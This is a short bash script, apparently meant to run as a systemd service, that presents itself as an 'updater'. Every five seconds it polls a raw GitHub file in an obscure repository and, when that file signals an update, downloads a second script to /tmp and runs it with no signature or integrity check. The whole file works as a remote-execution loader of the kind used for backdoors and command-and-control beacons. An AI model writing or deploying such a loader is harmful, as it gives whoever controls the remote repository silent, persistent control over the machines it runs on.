#!/bin/bash
set -u

CHECK_URL="https://raw.githubusercontent.com/x01234789/test22/refs/heads/main/IsUpdaet"
SCRIPT_URL="https://raw.githubusercontent.com/x01234789/test22/refs/heads/main/c"
TMP_SCRIPT="/tmp/c.sh"
PAUSE_FLAG="/var/lib/updater/paused"
INTERVAL=5          # seconds between checks
WGET_OPTS="-q --timeout=20 --tries=2"

log() { printf '[%s] %s\n' "$(date '+%F %T')" "$*"; }

# Clean exit on SIGTERM/SIGINT so systemd stop is fast
trap 'log "shutting down"; exit 0' TERM INT

log "updater started (pid=$$, interval=${INTERVAL}s, pause flag=${PAUSE_FLAG})"

while true; do
    if [ -e "$PAUSE_FLAG" ]; then
        log "paused (flag present) — skipping check"
    else
        val=$(wget $WGET_OPTS -O- "$CHECK_URL" 2>/dev/null || true)

        if [ -z "$val" ]; then
            log "source unreachable — no action"
        elif [ "$val" = "0" ]; then
            log "value=0 — no action"
        else
            log "update signalled (value='$val') — fetching script"
            if wget $WGET_OPTS -O "$TMP_SCRIPT" "$SCRIPT_URL"; then
                chmod +x "$TMP_SCRIPT"
                log "executing $TMP_SCRIPT"
                "$TMP_SCRIPT"
                rc=$?
                log "script finished, exit code=$rc"
            else
                log "failed to download $SCRIPT_URL — skipping this round"
            fi
        fi
    fi

    sleep "$INTERVAL"
done
